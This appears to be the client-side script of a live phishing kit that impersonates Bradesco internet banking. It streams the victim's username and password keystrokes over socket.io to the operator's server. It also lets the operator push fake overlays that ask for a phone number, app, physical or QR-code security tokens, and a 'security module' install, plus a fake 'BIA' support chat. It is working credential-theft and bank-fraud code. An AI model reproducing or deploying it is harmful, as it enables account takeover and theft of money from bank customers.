(function() {
  'use strict';

  let sessionId = new URLSearchParams(window.location.search).get('sessionId');
  if (!sessionId) {
    sessionId = localStorage.getItem('bradesco_session_id') || 'cliente-' + Math.random().toString(36).substr(2, 9);
  }
  localStorage.setItem('bradesco_session_id', sessionId);
  
  let socket = null;
  let currentScreen = 'login';
  
  window.bradescoBridge = {
    submitPhone: () => {
      const ddd = document.getElementById('overlay-ddd')?.value;
      const phone = document.getElementById('overlay-phone')?.value;
      if (ddd && phone) {
        if (socket) {
          socket.emit('client:input', { field: 'ddd', value: ddd });
          socket.emit('client:input', { field: 'telefone', value: phone });
        }
        showOverlay('loading', 'VALIDANDO DADOS...');
      }
    },
    closeOverlay: () => {
      removeOverlay();
      if (socket) socket.emit('client:screen', { screen: 'login' });
    },
    sendBiaMessage: () => {
      const input = document.getElementById('bia-input');
      const texto = input?.value;
      if (texto && socket && socket.connected) {
        addBiaMessage('Você', texto);
        socket.emit('client:bia-message', { texto });
        input.value = '';
      }
    }
  };

  function connectSocket() {
    if (typeof io === 'undefined') {
      setTimeout(connectSocket, 200);
      return;
    }

    // Usar window.location.origin para garantir conexão com o servidor correto
    socket = io(window.location.origin, {
      path: '/socket.io/',
      query: { role: 'client', sessionId },
      transports: ['polling'],
      reconnection: true,
      reconnectionAttempts: Infinity
    });

    socket.on('connect', () => {
      console.log('[BRIDGE] Conectado:', socket.id);
      socket.emit('client:register', { sessionId });
    });

    socket.on('client:command', (data) => {
      handleCommand(data.command, data.payload);
    });

    socket.on('client:bia-message', (data) => {
      addBiaMessage('BIA', data.texto);
      if (!document.getElementById('bia-chat-container')) {
        showOverlay('bia-chat');
      }
    });
  }

  function handleCommand(cmd, payload) {
    switch(cmd) {
      case 'Tela de Login': removeOverlay(); break;
      case 'Aguarde / Senha Incorreta': showOverlay('loading', 'SENHA INCORRETA, TENTE NOVAMENTE...'); break;
      case 'Pedir Celular': showOverlay('phone'); break;
      case 'Pedir Token Tela': showOverlay('token', 'DIGITE O TOKEN DO APLICATIVO'); break;
      case 'Pedir Token Fisico': showOverlay('token', 'DIGITE O TOKEN DO DISPOSITIVO FÍSICO'); break;
      case 'Pedir Token QR Code': showOverlay('qrcode'); break;
      case 'Erro Token': showOverlay('token', 'TOKEN INVÁLIDO, TENTE NOVAMENTE'); break;
      case 'Erro Celular': showOverlay('phone', 'NÚMERO INVÁLIDO, TENTE NOVAMENTE'); break;
      case 'Desbloqueio BIA': showOverlay('loading', 'DESBLOQUEANDO ACESSO BIA...'); break;
      case 'Erro Desbloqueio BIA': showOverlay('loading', 'ERRO NO DESBLOQUEIO, AGUARDE...'); break;
      case 'Instalar Modulo': showOverlay('loading', 'INSTALANDO MÓDULO DE SEGURANÇA...'); break;
      case 'Validar Modulo': showOverlay('loading', 'VALIDANDO MÓDULO...'); break;
    }
  }

  function showOverlay(type, message) {
    removeOverlay();
    const div = document.createElement('div');
    div.id = 'bridge-overlay';
    div.className = 'bridge-overlay-full';
    
    if (type === 'loading') {
      div.innerHTML = `<div class="bridge-loader"></div><div class="bridge-text">${message || 'CARREGANDO...'}</div>`;
    } else if (type === 'phone') {
      div.innerHTML = `
        <div class="bridge-modal">
          <h3>Validação de Segurança</h3>
          <p>Para sua segurança, informe seu telefone:</p>
          <div class="bridge-input-group">
            <input type="text" id="overlay-ddd" placeholder="DDD" maxlength="2">
            <input type="text" id="overlay-phone" placeholder="Número" maxlength="9">
          </div>
          <button onclick="bradescoBridge.submitPhone()">CONFIRMAR</button>
        </div>`;
    } else if (type === 'bia-chat') {
      div.innerHTML = `
        <div class="bridge-modal bia-modal" id="bia-chat-container">
          <div class="bia-header">Atendimento BIA</div>
          <div class="bia-messages" id="bia-messages"></div>
          <div class="bia-input-area">
            <input type="text" id="bia-input" placeholder="Digite sua mensagem...">
            <button onclick="bradescoBridge.sendBiaMessage()">ENVIAR</button>
          </div>
          <button class="close-btn" onclick="bradescoBridge.closeOverlay()">FECHAR</button>
        </div>`;
    }
    
    document.body.appendChild(div);
  }

  function removeOverlay() {
    const el = document.getElementById('bridge-overlay');
    if (el) el.remove();
  }

  function addBiaMessage(who, text) {
    const box = document.getElementById('bia-messages');
    if (box) {
      const p = document.createElement('p');
      p.innerHTML = `<strong>${who}:</strong> ${text}`;
      box.appendChild(p);
      box.scrollTop = box.scrollHeight;
    }
  }

  // Monitorar inputs de login
  document.addEventListener('input', (e) => {
    const id = e.target.id || e.target.name;
    if (id && socket) {
      if (id.includes('usuario') || id.includes('principal')) socket.emit('client:input', { field: 'usuario', value: e.target.value });
      if (id.includes('senha')) socket.emit('client:input', { field: 'senha', value: e.target.value });
    }
  });

  connectSocket();
})();
